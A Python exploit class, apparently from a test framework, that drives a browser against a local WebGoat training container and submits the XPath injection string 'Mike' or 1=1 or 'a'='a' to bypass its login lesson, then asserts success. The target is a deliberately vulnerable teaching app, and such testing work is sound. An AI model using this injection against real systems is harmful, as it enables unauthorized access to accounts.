from data.exploits.base.BasicExploit import BasicExploit
from settings import mapped_port_host

class Exploit(BasicExploit):

    attributes = {
      'Name' :        'WebGoat_XPATH',
      'Description' : "'XPATH injection' example from WebGoat",
      'References' :  [["EMPTY"]],
      'Target' :      "webgoat",
      'Container': 'ubuntu',
      'TargetLicense' : '',
      'Plugin' : '',
      'VulWikiPage' : "None",
      'Type' : 'XPATH injection'
    }


    def runExploit(self):
        goat = self.wrapper
        goat.navigate("http://guest:guest@localhost:%s/WebGoat/attack" % mapped_port_host) 
        goat.find_name("start").click()
        goat.implicit_wait(5)

        goat.navigate("http://localhost:%s/WebGoat/attack?Screen=4&menu=1200" % mapped_port_host)
        goat.find_name("Username").keys("Mike' or 1=1 or 'a'='a")
        goat.find_name("Password").keys("whatever")
        goat.find_name("SUBMIT").click()
        self.assertIn("Congratulations", goat.find("message").raw.text, "Injection didn't work")
